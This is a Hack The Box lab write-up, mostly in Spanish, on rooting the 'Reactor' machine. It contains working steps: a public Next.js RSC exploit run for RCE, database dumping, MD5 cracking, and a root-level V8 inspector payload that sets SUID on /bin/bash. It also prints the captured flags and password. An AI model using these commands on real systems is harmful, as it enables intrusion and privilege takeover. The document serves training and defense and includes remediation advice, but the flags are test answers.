# Offensive Security Assessment Report: HTB — Reactor

![Hack The Box](https://img.shields.io/badge/Platform-Hack%20The%20Box-green?style=for-the-badge&logo=hackthebox)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=for-the-badge)
![OS](https://img.shields.io/badge/OS-Linux-orange?style=for-the-badge)
![Standards](https://img.shields.io/badge/Standards-OffSec%20PEN--200%20%2F%20PTES-purple?style=for-the-badge)
![Assessor](https://img.shields.io/badge/Assessor-araizcorp%20Offensive%20Security-blue?style=for-the-badge)

**Offensive Security Assessment & Penetration Testing Report** conducted on the target environment **HTB — Reactor** hosted on **Hack The Box**, executed in accordance with **OffSec PEN-200 (OSCP)** and **PTES (Penetration Testing Execution Standard)** methodologies.

---

## 📑 1. Executive Summary

* **Assessment Objective:** Identify, validate, and exploit security vulnerabilities across the target host to assess operational impact on confidentiality, integrity, and system availability.
* **Risk Rating:** `CRITICAL` (Unauthenticated remote exploit vector leading to complete host compromise and administrative takeover).
* **Initial Access Vector:** CVE-2025-55182 (Next.js RSC RCE) + Node.js V8 Inspector Privesc. Linux. Rooted.
* **Privilege Escalation Vector:** Local Privilege Escalation
* **Engagement Outcome:** Complete Host Compromise (`User Proof` and `Root / SYSTEM Proof` successfully retrieved and verified).

### Target Technical Specifications

| Parameter | Technical Detail |
| :--- | :--- |
| **Target Host** | HTB — Reactor |
| **Platform** | Hack The Box |
| **Operating System** | Linux |
| **Difficulty Rating** | Easy |
| **Associated CVE(s)** | N/A |
| **Initial Foothold Vector** | CVE-2025-55182 (Next.js RSC RCE) + Node.js V8 Inspector Privesc. Linux. Rooted. |
| **Privilege Escalation Vector** | Local Privilege Escalation |
| **Lead Penetration Tester** | Pedro Araiz (`araizcorp`) |

---

## 🎯 2. Attack Path & Kill Chain Workflow

```
[ Phase 1: Reconnaissance & Port Scanning ]
         │─── TCP SYN scanning and service fingerprinting (Nmap)
         └─── Attack surface mapping and daemon enumeration
         │
         ▼
[ Phase 2: Vulnerability Analysis & Service Enumeration ]
         │─── Web directory fuzzing, parameter discovery, and banner analysis
         └─── CVE identification and credential harvesting
         │
         ▼
[ Phase 3: Exploitation & Initial Foothold ]
         │─── Exploit delivery: CVE-2025-55182 (Next.js RSC RCE) + Node.js V8 Inspector Privesc. Linux. Rooted.
         └─── Establishing an interactive reverse shell with unprivileged user context
         │
         ▼
[ Phase 4: Local Privilege Escalation ]
         │─── Internal audit: Local Privilege Escalation
         └─── Elevation to superuser / administrator privileges (root / SYSTEM)
         │
         ▼
[ Phase 5: Evidence & Flag Retrieval ]
         └─── Capture and cryptographic verification of user.txt and root.txt
```

---

## 🔬 3. Technical Walkthrough & Step-by-Step Proof of Concept

Estado: Rooted ✅
Fecha: 24 de mayo de 2026

Notas: worker.js corre como root con --inspect=127.0.0.1:9229 → tunnel SSH -L 9229 → node inspect → chmod +s /bin/bash → bash -p

Técnicas: Next.js RSC Deserialization · SQLite exfil · MD5 cracking · SSH tunnel · Node.js V8 Inspector privesc · SUID bash



> ⚠️ **DRAFT — No publicar hasta que HTB retire la máquina oficialmente**
> 

---

## 📋 Info de la máquina



---

## 🗺️ Kill Chain (resumen)

1. nmap → puertos 22 (SSH) y 3000 (Next.js)
2. whatweb → `X-Powered-By: Next.js` confirmado
3. CVE-2025-29927 probado → **no aplica** (sin middleware de autenticación)
4. **CVE-2025-55182** → RCE sin autenticación vía deserialización RSC
5. `cat reactor.db` vía RCE → hashes MD5 de usuarios
6. hashcat → `engineer:reactor1`
7. SSH como engineer → **user flag** ✅
8. `ps aux` → `node --inspect=127.0.0.1:9229` corriendo como **root**
9. SSH tunnel `-L 9229:127.0.0.1:9229` → acceso al V8 Inspector
10. `node inspect` → `chmod +s /bin/bash` como root
11. `bash -p` → euid=0 → **root flag** ✅

---

## Phase 1 — Reconocimiento

### nmap

```bash
nmap -sV -sC -O -T4 --min-rate 5000 -p- 10.129.4.20
```

**Resultado clave:**

- Puerto **22** → OpenSSH 8.9p1 (Ubuntu 22.04)
- Puerto **3000** → Node.js (Next.js app)

![nmap — puertos 22 y 3000 abiertos, Ubuntu 22.04](https://files.catbox.moe/bjoy81.png)

nmap — puertos 22 y 3000 abiertos, Ubuntu 22.04

### whatweb

```bash
whatweb http://reactor.htb:3000
```

**Scan Outcome: **

```
http://reactor.htb:3000 [200 OK]
Title: ReactorWatch | Core Monitoring System
X-Powered-By: Next.js
Headers: x-nextjs-cache, x-nextjs-prerender, x-nextjs-stale-time
```

![whatweb — Next.js confirmado, título ReactorWatch](https://files.catbox.moe/zleyhd.png)

whatweb — Next.js confirmado, título ReactorWatch

> 💡 La cabecera `X-Powered-By: Next.js` orienta inmediatamente la investigación hacia CVE-2025-29927 y CVE-2025-55182.
> 

---

## Phase 2 — Enumeración Web

La app es un **dashboard de monitoreo de reactor nuclear** — ReactorWatch Core Monitoring System v3.2.1.

![Dashboard ReactorWatch — Core Status NOMINAL, temperatura 324°C, presión 155 bar](https://files.catbox.moe/rszoy5.png)

Dashboard ReactorWatch — Core Status NOMINAL, temperatura 324°C, presión 155 bar

### Identificar versión y cabeceras

```bash
curl -si http://reactor.htb:3000 | grep -i "x-powered\|next\|vary"
```

![curl -v — código fuente con referencias a chunks JS de Next.js](https://files.catbox.moe/wd09cf.png)

curl -v — código fuente con referencias a chunks JS de Next.js

### Probar CVE-2025-29927 — Middleware Bypass

```bash
gobuster dir -u http://reactor.htb:3000 \
  -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt \
  -t 50 -q \
  --exclude-length 17175 \
  -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware"
```

> ⚠️ **CVE-2025-29927 no aplica.** La aplicación no implementa middleware de autenticación en Next.js. No hay rutas protegidas que bypassear.
> 

### Enumerar chunks JavaScript

```bash

curl -s http://reactor.htb:3000 | grep -oP '/_next/static/chunks/[^"]+\.js' | sort -u
```

![chunks JS — grep output con los 5 archivos .js de Next.js](https://files.catbox.moe/ed4zf8.png)

chunks JS — grep output con los 5 archivos .js de Next.js

```bash

for chunk in 4bd1b696-80bcaf75e1b4285e 517-d083b552e04dead1 main-app-4fbb4b1f318e39a0 polyfills-42372ed130431b0a webpack-db0a529a99835594; do
  echo "=== $chunk ==="
  curl -s http://reactor.htb:3000/_next/static/chunks/$chunk.js \
    | grep -oP '[a-f0-9]{40}' | head -5
done
```

![loop sobre chunks — for loop, sin secretos hexadecimales, superficie RSC confirmada](https://files.catbox.moe/k1jtjw.png)

loop sobre chunks — for loop, sin secretos hexadecimales, superficie RSC confirmada

---

## Phase 3 — Acceso Inicial — CVE-2025-55182


> **Assessment Query / Target Milestone:** ### ¿Qué es CVE-2025-55182?



### Phase 3: Exploitation & Initial Foothold

```bash

git clone https://github.com/Chocapikk/CVE-2025-55182
cd CVE-2025-55182
pip install -r requirements.txt --break-system-packages


python3 exploit.py -u http://reactor.htb:3000/ --cmd "id"


python3 exploit.py -u http://reactor.htb:3000/ --cmd "cat reactor.db"
```

![[exploit.py](http://exploit.py) — Success · SQLite schema · tabla users con hashes MD5 visibles](https://files.catbox.moe/i91s0n.png)

[exploit.py](http://exploit.py) — Success · SQLite schema · tabla users con hashes MD5 visibles

### Datos extraídos de reactor.db

```sql
-- Esquema
CREATE TABLE users (
  id INTEGER PRIMARY KEY,
  username TEXT NOT NULL,
  password_hash TEXT NOT NULL,
  role TEXT NOT NULL,
  email TEXT
);

-- Registros
-- engineer | 39d97110eafe2a9a68639812cd271e8e | operator    | engineer@reactor.htb
-- admin    | a203b22191d744a4e70ada5c101b17b8 | administrator | admin@reactor.htb
```

---

## Phase 4 — Cracking de Credenciales

Los hashes son **MD5 sin salt** — el formato más débil posible.

```bash
echo "39d97110eafe2a9a68639812cd271e8e" > hashes.txt
echo "a203b22191d744a4e70ada5c101b17b8" >> hashes.txt

hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

![CrackStation — engineer:reactor1 crackeado, admin hash not found](https://files.catbox.moe/z3npkc.png)

CrackStation — engineer:reactor1 crackeado, admin hash not found

### Resultados

| Usuario | Hash (MD5) | Password | Estado |
| --- | --- | --- | --- |
| engineer | `39d97110...1e8e` | **reactor1** | ✅ Crackeado |
| admin | `a203b221...17b8` | — | ❌ No encontrado |

> ⚠️ Almacenar contraseñas como MD5 sin salt en 2025 es una vulnerabilidad crítica por sí misma. `reactor1` cae inmediatamente en rockyou.txt.
> 

---

## Phase 5 — Acceso SSH

```bash
ssh engineer@10.129.4.20

```

Banner del servidor:

```
ReactorWatch Core Monitoring System
Nuclear Dynamics Corp. — Site 7
AUTHORIZED PERSONNEL ONLY
```

```bash
engineer@reactor:~$ cat user.txt
6b6cad1db627d82d3c0ad2863d9d5a27
```

![SSH login exitoso — banner ReactorWatch Nuclear Dynamics Corp · user.txt leído](https://files.catbox.moe/8tap1b.png)

SSH login exitoso — banner ReactorWatch Nuclear Dynamics Corp · user.txt leído

### 🏴 User Flag

```
6b6cad1db627d82d3c0ad2863d9d5a27
```

---

## Phase 6 — Enumeración Local

```bash

id




ss -tlnp


ps aux | grep node

```

![id — engineer en grupos lxd y adm, ps aux con node --inspect como root](https://files.catbox.moe/rutrlv.png)

id — engineer en grupos lxd y adm, ps aux con node --inspect como root

> 🔴 **Vector crítico:** El proceso `/opt/uptime-monitor/worker.js` corre como **root** con `--inspect=127.0.0.1:9229` activo. El V8 Inspector expone un WebSocket que permite ejecutar JavaScript arbitrario en el contexto del proceso.
> 

**Nota sobre grupo lxd:**

El grupo `lxd` sería un vector alternativo (montar el FS root en un contenedor), pero el Node.js inspector es más directo.

---

## Phase 7 — Privilege Escalation — Node.js V8 Inspector


> **Assessment Query / Target Milestone:** ### ¿Qué es el V8 Inspector?

Cuando Node.js arranca con `--inspect`, habilita el protocolo **CDP (Chrome DevTools Protocol)** en el puerto especificado. Este protocolo permite ejecutar JavaScript directamente en el runtime del proceso. Si el proceso corre como root → **RCE como root**.

### Paso 1 — Túnel SSH

Desde Kali, en una terminal, crear el tunnel para exponer el puerto 9229 del servidor:

```bash
ssh -L 9229:127.0.0.1:9229 engineer@10.129.4.20
```

![SSH tunnel -L 9229:127.0.0.1:9229 — port forwarding establecido](https://files.catbox.moe/70tvod.png)

SSH tunnel -L 9229:127.0.0.1:9229 — port forwarding establecido

### Paso 2 — Conectar al Inspector

En otra terminal de Kali:

```bash
node inspect 127.0.0.1:9229
```

### Paso 3 — Ejecutar payload como root

```jsx
// Dentro del prompt debug> del V8 Inspector
// El proceso corre como root → todo lo que ejecutamos aquí es root
exec("process.mainModule.require('child_process').execSync('chmod +s /bin/bash').toString()")
// Scan Outcome: '' (string vacío = éxito)
```

![node inspect 127.0.0.1:9229 — conexión ok · payload chmod +s /bin/bash ejecutado como root](https://files.catbox.moe/o0hpqk.png)

node inspect 127.0.0.1:9229 — conexión ok · payload chmod +s /bin/bash ejecutado como root

### Paso 4 — Bash con SUID → root

De vuelta en la sesión SSH de engineer:

```bash
bash -p

bash-5.2# id


bash-5.2# cd /root && cat root.txt
```

![bash -p → euid=0(root) · root.txt leído](https://files.catbox.moe/ng7b7n.png)

bash -p → euid=0(root) · root.txt leído

### 🏴 Root Flag

```
b92cb9475893f66316404491b3108fc8
```

---

## 🛡️ Lecciones — Blue Team

- **Actualizar Next.js** si usas App Router (RSC) en versiones ≤ 15.0.3
- **Nunca usar MD5** para contraseñas — usar bcrypt / argon2 con salt único
- **Deshabilitar `--inspect` en producción** — o restringirlo a un socket Unix con autenticación
- **Principio de mínimo privilegio** — el worker de monitoreo no necesita correr como root
- **Revisar grupo lxd** — cualquier usuario en este grupo puede escalar a root

## ⚔️ Lecciones — Red Team

- Siempre comprobar `X-Powered-By` y encabezados de framework → orientan directamente a CVEs
- En Node.js, `ps aux | grep inspect` es un check obligatorio en post-explotación
- El grupo `lxd` es privesc inmediato — siempre revisar grupos con `id`
- Túneles SSH (`-L`) son la forma limpia de alcanzar servicios loopback sin subir herramientas
- CVE-2025-55182 requiere App Router habilitado — los chunks `/_next/static/` lo confirman

---

## 🔗 Referencias

- [CVE-2025-55182 PoC — Chocapikk](https://github.com/Chocapikk/CVE-2025-55182)
- [HackTricks — Node Inspector RCE](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/node-inspector-devtools-rce)
- [HTB — Reactor](https://www.hackthebox.com/machines/reactor)
- [Next.js Security Advisory CVE-2025-55182](https://nextjs.org/blog/cve-2025-55182)

---

*Writeup por AraizCorp LLC · [araizcorp.tech](http://araizcorp.tech) · 2026*

---

## 🛡️ 4. Strategic Remediation & Hardening Roadmap

### Immediate Tactical Actions (P1)
1. **Patch Management & Software Upgrades:** Immediately apply official security updates and patches for all vulnerable software components and exposed services (N/A).
2. **Access Control & SUID Audit:** Remove unnecessary SUID/SGID bits, audit `/etc/sudoers` rules, and enforce strict Access Control Lists (ACLs) on sensitive files and administrative scripts.
3. **Attack Surface Reduction:** Configure host-based firewalls (e.g., `iptables` / `ufw` / Windows Firewall) to restrict exposure of management services and internal ports to trusted administrative subnets only.

### Architectural & Defensive Hardening (P2)
1. **Principle of Least Privilege (PoLP):** Ensure public-facing daemons run under dedicated low-privileged service accounts configured with non-interactive login shells (`/sbin/nologin`).
2. **Network Microsegmentation:** Isolate production servers and database tiers within dedicated VLANs, enforcing stateful inspection and ingress/egress filtering on east-west traffic.
3. **Endpoint Detection & Telemetry (EDR):** Implement centralized logging and behavior-based detection rules to capture anomalous process spawning, unauthorized script interpreter execution, and suspicious outbound socket connections.

---

## 📊 5. MITRE ATT&CK Enterprise Framework Mapping

| Tactic | Technique ID | Technique Name | Technical Application in Engagement |
| :--- | :--- | :--- | :--- |
| **Reconnaissance** | `T1595.002` | Active Scanning: Vulnerability Scanning | Automated and manual port scanning, banner grabbing, and service discovery |
| **Initial Access** | `T1190` | Exploit Public-Facing Application | Exploitation of exposed network/web service (CVE-2025-55182 (Next.js RSC RCE) + Node.js V8 Inspector Privesc. Linux. Rooted.) |
| **Execution** | `T1059` | Command and Scripting Interpreter | Interactive reverse shell execution and remote command dispatch |
| **Privilege Escalation** | `T1068 / T1548` | Abuse Elevation Control Mechanism / Exploitation | Local elevation to administrative/root privileges (Local Privilege Escalation) |

---

© 2026 **araizcorp** — Technical documentation and security assessment portfolio developed for **OffSec** certification preparation (OSCP, OSEP, OSWE) and commercial penetration testing enablement.
